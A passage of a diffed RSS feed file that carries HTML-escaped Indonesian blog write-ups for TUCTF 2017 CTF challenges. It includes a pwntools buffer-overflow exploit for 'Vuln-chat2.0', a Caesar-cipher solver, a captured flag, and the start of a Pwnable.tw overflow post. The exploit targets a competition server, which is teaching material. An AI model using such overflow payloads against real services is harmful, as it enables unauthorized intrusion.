+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;pwn-100-vuln-chat20&quot;&gt;Pwn 100 (Vuln-chat2.0)&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Classic Buffer Overflow&lt;/em&gt; yang dimana mengoverwrite nilai &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;, tetapi kita hanya membutuhkan 1 byte address dari fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;printFlag&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x72&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vulnchat2.tuctf.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your username: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAA: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vuln2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;crypto-50-the-never-ending-crypto&quot;&gt;Crypto 50 (The Never Ending Crypto)&lt;/h2&gt;
+
+&lt;p&gt;Crypto 50 sebenar nya hanya &lt;code class=&quot;highlighter-rouge&quot;&gt;Caesar Cipher&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Berikut script yang saya gunakan untuk melakukan decrypt&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;never&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;neverending.tuctf.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12345&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#$&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;()*+,-./:;&amp;lt;=&amp;gt;?@[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;]^_`{|}~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;round1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;enc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;is &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;enc_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;is &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;enc_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; decrypted?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ENC BASE : -&amp;gt; {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ENC MSG : -&amp;gt; {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;cal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+	
+	&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;non_printable2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printable2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;190&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;non_printable2&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;non_printable2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Decrypted -&amp;gt; {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;repr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Round {0}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;round1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Correct!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-&amp;gt; BENAR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-&amp;gt; SALAH&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Pada Round 50 akan mendatkan Flag.&lt;/p&gt;
+
+&lt;h3 id=&quot;flag--tuctfwh0wsher3la5tyer&quot;&gt;Flag : TUCTF{wh0_w@s_her3_la5t_ye@r?!?}&lt;/h3&gt;
+</description>
+        <pubDate>Mon, 27 Nov 2017 00:00:00 +0700</pubDate>
+        <link>https://rhama.my.id/ctf/2017/11/27/tuctf-2017.html</link>
+        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/27/tuctf-2017.html</guid>
+        
+        <category>tuctf2017</category>
+        
+        <category>CTF</category>
+        
+        
+        <category>CTF</category>
+        
+      </item>
+    
+      <item>
         <title>School CTF 2017 - Write Up</title>
         <description>&lt;article class=&quot;post-content&quot;&gt;
 &lt;h1&gt;&lt;strong&gt;Website&lt;/strong&gt;&lt;/h1&gt;
@@ -1227,249 +1763,123 @@ Gunanya regex : &lt;strong&gt;^[ -~]+$&lt;/strong&gt; adalah agar match dengan s
       </item>
     
       <item>
-        <title>Pwnable.tw - Start (100)</title>
-        <description>&lt;article class=&quot;post-content&quot;&gt;
-&lt;p&gt;Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung.&lt;/p&gt;
-&lt;p&gt;Berikut informasi binary start.&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ &lt;span style=&quot;color:#9b859d;&quot;&gt;file&lt;/span&gt; start                                                                                                                      
-start: ELF &lt;span style=&quot;color:#3387cc;&quot;&gt;32&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;bit LSB executable, Intel &lt;span style=&quot;color:#3387cc;&quot;&gt;80386&lt;/span&gt;, version &lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt; (SYSV), statically linked, &lt;span style=&quot;color:#e28964;&quot;&gt;not&lt;/span&gt; stripped
-$ checksec start                                                                                                                  
-[&lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;] &lt;span style=&quot;color:#65b042;&quot;&gt;'start'&lt;/span&gt;
